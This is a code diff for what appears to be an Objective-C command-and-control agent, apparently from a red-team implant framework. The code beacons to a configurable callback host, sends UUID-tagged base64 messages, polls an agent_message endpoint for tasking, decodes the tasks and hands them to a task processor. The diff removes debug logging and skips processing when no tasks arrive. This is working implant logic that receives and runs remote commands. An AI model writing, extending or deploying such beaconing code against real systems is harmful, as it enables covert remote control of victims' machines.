@@ -64,7 +64,6 @@ NSString *callbackUUID = nil;
     NSMutableData *messageData = [[payload[@"uuid"] dataUsingEncoding:NSUTF8StringEncoding] mutableCopy];
     [messageData appendData:jsonData];
     NSString *base64Message = [messageData base64EncodedStringWithOptions:0];
-    NSLog(@"[DEBUG] Base64 Message: %@", base64Message);
     
     /// Setup the POST request
     NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
@@ -175,7 +174,6 @@ NSString *callbackUUID = nil;
     /// The get_tasking endpoint: `http://<callbackHost>:<callbackPort>/agent_message`
     NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
     NSURL *url = [NSURL URLWithString:urlString];
-    NSLog(@"[DEBUG] Get Tasking URL: %@", url);
     
     /// Construct the get_tasking JSON
     NSDictionary *taskingData = @{
@@ -194,8 +192,6 @@ NSString *callbackUUID = nil;
         NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
         if (httpResponse.statusCode == 200 && data) {
             NSString *responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-            NSLog(@"[DEBUG] Received tasking (Base64): %@", responseString);
-            
             NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
             if (!decodedData) {
                 NSLog(@"[ERROR] ❌ Failed to decode Base64 tasking response.");
@@ -211,8 +207,10 @@ NSString *callbackUUID = nil;
                 
                 if (taskingResponse) {
                     NSArray *tasksArray = taskingResponse[@"tasks"];
-                    NSLog(@"[DEBUG] 📋 Tasks received: %@", tasksArray);
-                    [self processTasksFromResponse:taskingResponse];
+                    if (tasksArray.count > 0) {
+                        NSLog(@"[DEBUG] 📋 Tasks received: %@", tasksArray);
+                        [self processTasksFromResponse:taskingResponse];
+                    }
                 } else {
                     NSLog(@"[ERROR] ❌ Failed to parse JSON from decoded tasking response.");
                 }
